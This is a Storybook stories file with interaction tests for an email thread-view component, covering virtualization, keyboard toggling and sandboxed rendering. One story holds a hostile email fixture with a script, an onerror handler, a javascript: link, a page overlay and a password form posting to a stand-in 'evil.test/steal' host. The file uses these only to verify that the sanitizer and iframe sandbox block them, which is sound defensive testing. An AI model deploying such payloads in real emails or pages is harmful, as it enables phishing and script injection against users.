import type { Meta, StoryObj } from '@storybook/react-vite';
import { expect, userEvent, waitFor } from 'storybook/test';
import { type ThreadMessage, ThreadView } from './thread-view';

const PEOPLE = ['Darlene Robertson', 'Juma Omondi', 'Bessie Cooper', 'Albert Flores'];

// Offline inline image: a small data: SVG chart, like a pasted screenshot.
const CHART = `data:image/svg+xml;utf8,${encodeURIComponent(
  '<svg xmlns="http://www.w3.org/2000/svg" width="480" height="160"><rect width="480" height="160" fill="#f5f5f5"/><rect x="40" y="60" width="60" height="80" fill="#3b82f6"/><rect x="140" y="30" width="60" height="110" fill="#3b82f6"/><rect x="240" y="90" width="60" height="50" fill="#3b82f6"/><rect x="340" y="20" width="60" height="120" fill="#3b82f6"/></svg>',
)}`;

function emailHtml(i: number, from: string): string {
  const parts = [
    `<p>Hi team,</p>`,
    `<p>Following up on ticket #${4100 + i}. The sync job failed again at ${(i % 12) + 1}:15 UTC with <code>401 invalid_grant</code>. We rotated the key last week and sandbox still works, so this looks specific to production.</p>`,
  ];
  if (i % 5 === 0)
    parts.push(
      `<table cellpadding="6" style="border-collapse:collapse;border:1px solid #d4d4d4"><tr><th align="left">Job</th><th align="left">Status</th><th align="left">Last run</th></tr><tr><td>orders-sync</td><td>Failed</td><td>09:15</td></tr><tr><td>inventory-sync</td><td>OK</td><td>09:10</td></tr><tr><td>refunds-sync</td><td>Failed</td><td>08:55</td></tr></table>`,
    );
  if (i % 7 === 0) parts.push(`<p><img src="${CHART}" alt="Error rate by hour" width="480"></p>`);
  parts.push(`<p>Thanks,<br>${from}</p>`);
  if (i > 0)
    parts.push(
      `<blockquote><p>On the previous message, ${PEOPLE[(i + 1) % PEOPLE.length]} wrote:</p><p>Could you share the request id and the exact time of the last failure?</p></blockquote>`,
    );
  return parts.join('');
}

const SIXTY: ThreadMessage[] = Array.from({ length: 60 }, (_, i) => {
  const from = PEOPLE[i % PEOPLE.length]!;
  return {
    id: `m${i + 1}`,
    from,
    sentAt: `Oct ${1 + Math.floor(i / 6)}, ${String(8 + (i % 10)).padStart(2, '0')}:${String((i * 7) % 60).padStart(2, '0')}`,
    preview: `Following up on ticket #${4100 + i}: the sync job failed again`,
    html: emailHtml(i, from),
  };
});

const meta = {
  title: 'Composites/ThreadView',
  component: ThreadView,
  parameters: {
    design: { figmaNode: 'none' },
    ai: {
      summary:
        'A long email thread: collapsed messages are one-line previews, expanded ones render the email in a sandboxed iframe. Virtualized.',
      useWhen: 'The conversation timeline of an email thread.',
      avoidWhen:
        'Short, non-email text (notes, chat bubbles): render it directly. Never render email HTML outside EmailFrame.',
    },
    layout: 'fullscreen',
  },
} satisfies Meta<typeof ThreadView>;
export default meta;
type Story = StoryObj<typeof meta>;

const frames = (el: HTMLElement) => el.querySelectorAll('iframe[data-slot=email-frame]').length;

/** 60 messages, every other one expanded. Only expanded messages near the viewport mount a frame. */
export const Sixty: Story = {
  args: {
    messages: SIXTY,
    defaultExpandedIds: SIXTY.filter((_, i) => i % 2 === 0).map((m) => m.id),
    className: 'h-160',
  },
  play: async ({ canvasElement }) => {
    const scroller = canvasElement.querySelector<HTMLElement>('[data-slot=thread-view]')!;
    await waitFor(() => expect(frames(canvasElement)).toBeGreaterThan(0));
    await expect(frames(canvasElement)).toBeLessThanOrEqual(10);
    // It opens on the latest message.
    // Measuring 60 rows then scrolling can exceed waitFor's 1s default when the machine is busy.
    await waitFor(() => expect(scroller.querySelector('[data-index="59"]')).not.toBeNull(), {
      timeout: 5000,
    });
    scroller.scrollTop = 0;
    await waitFor(() => expect(scroller.querySelector('[data-index="1"] button')).not.toBeNull(), {
      timeout: 5000,
    });

    // Keyboard: the second message's header collapses/expands with Enter.
    const header = scroller.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')[1]!;
    header.focus();
    await expect(header).toHaveAttribute('aria-expanded', 'false');
    await userEvent.keyboard('{Enter}');
    await waitFor(() => expect(header).toHaveAttribute('aria-expanded', 'true'));
    await userEvent.keyboard('{Enter}');
    await waitFor(() => expect(header).toHaveAttribute('aria-expanded', 'false'));

    // Scroll to the end and back: frame count stays bounded while 60 messages exist.
    for (const top of [scroller.scrollHeight, 0]) {
      scroller.scrollTop = top;
      await new Promise((r) => setTimeout(r, 300));
      await expect(frames(canvasElement)).toBeLessThanOrEqual(10);
    }
    await expect(scroller.querySelector('[aria-setsize]')).toHaveAttribute('aria-setsize', '60');
  },
};

const HOSTILE = `
<style>body,*{background:#ff0000!important;font-size:40px!important} .app,.host-check{display:none!important}</style>
<div style="position:fixed;inset:0;z-index:2147483647;background:#000;color:#fff">Overlay</div>
<script>window.parent.__hostile = 'script'; window.__hostile = 'script';</script>
<img src="x" alt="broken" onerror="window.parent.__hostile='onerror'">
<form action="https://evil.test/steal"><input name="password"><button>Log in</button></form>
<p><a href="javascript:window.parent.__hostile='js-link'">Click me</a> and <a href="https://example.test/ok">a normal link</a>.</p>
<p>Real content survives.</p>`;

/** Email HTML that tries to escape: global CSS, overlays, scripts, handlers, forms, javascript: links. */
export const HostileEmail: Story = {
  args: {
    messages: [
      { id: 'h1', from: 'Mallory', sentAt: 'Oct 12, 09:00', preview: 'Hostile', html: HOSTILE },
    ],
    className: 'h-160',
  },
  render: (args) => (
    <div>
      <p data-testid="host-check" className="host-check p-4 text-14 leading-20 text-neutral-strong">
        This paragraph is outside the email.
      </p>
      <ThreadView {...args} />
    </div>
  ),
  play: async ({ canvasElement }) => {
    const frame = await waitFor(() => {
      const f = canvasElement.querySelector<HTMLIFrameElement>('iframe[data-slot=email-frame]');
      expect(f?.contentDocument?.body?.textContent).toContain('Real content survives');
      return f!;
    });
    const doc = frame.contentDocument!;

    // The sandbox has no allow-scripts, and the sanitizer drops scripts, handlers and forms.
    await expect(frame.getAttribute('sandbox')).not.toContain('allow-scripts');
    await expect(doc.querySelector('script')).toBeNull();
    await expect(doc.querySelector('form, input, button')).toBeNull();
    await expect(doc.querySelector('[onerror]')).toBeNull();
    for (const a of doc.querySelectorAll('a'))
      await expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i);
    await new Promise((r) => setTimeout(r, 200));
    await expect((window as { __hostile?: string }).__hostile).toBeUndefined();

    // The email's own global CSS is kept (FORCE_BODY) and applies inside the frame...
    await expect(getComputedStyle(doc.body).backgroundColor).toBe('rgb(255, 0, 0)');
    // ...but nothing leaks into the app: the host paragraph keeps its own styles and stays visible.
    const host = canvasElement.querySelector<HTMLElement>('[data-testid=host-check]')!;
    await expect(host).toBeVisible();
    await expect(getComputedStyle(host).fontSize).toBe('14px');
    await expect(getComputedStyle(host).backgroundColor).not.toBe('rgb(255, 0, 0)');
    // The fixed overlay is confined to the frame's box.
    const overlay = [...doc.querySelectorAll('div')].find((d) => d.textContent === 'Overlay')!;
    await expect(overlay.getBoundingClientRect().width).toBeLessThanOrEqual(frame.clientWidth);
  },
};

const HEAD_CSS = `<html><head><style>
  .lead { color: rgb(0, 128, 0); font-weight: 700 }
  td { padding: 6px; border: 1px solid rgb(200, 200, 200) }
</style></head><body>
<p class="lead">Your order has shipped</p>
<table><tr><td>Order</td><td>#4821</td></tr><tr><td>Carrier</td><td>Parcelpath</td></tr></table>
</body></html>`;

/** CSS in <head>, as Outlook, Gmail and newsletters send it: kept, and scoped to the frame. */
export const HeadCss: Story = {
  args: {
    messages: [
      { id: 'c1', from: 'Shop', sentAt: 'Oct 12, 09:00', preview: 'Shipped', html: HEAD_CSS },
    ],
    className: 'h-160',
  },
  render: (args) => (
    <div>
      <p data-testid="outside" className="lead p-4 text-14 leading-20 text-neutral-strong">
        Outside the email, with the same class name.
      </p>
      <ThreadView {...args} />
    </div>
  ),
  play: async ({ canvasElement }) => {
    const frame = await waitFor(() => {
      const f = canvasElement.querySelector<HTMLIFrameElement>('iframe[data-slot=email-frame]');
      expect(f?.contentDocument?.querySelector('.lead')).toBeTruthy();
      return f!;
    });
    const lead = frame.contentDocument!.querySelector<HTMLElement>('.lead')!;
    await expect(getComputedStyle(lead).color).toBe('rgb(0, 128, 0)');
    await expect(getComputedStyle(lead).fontWeight).toBe('700');
    const outside = canvasElement.querySelector<HTMLElement>('[data-testid=outside]')!;
    await expect(getComputedStyle(outside).color).not.toBe('rgb(0, 128, 0)');
  },
};
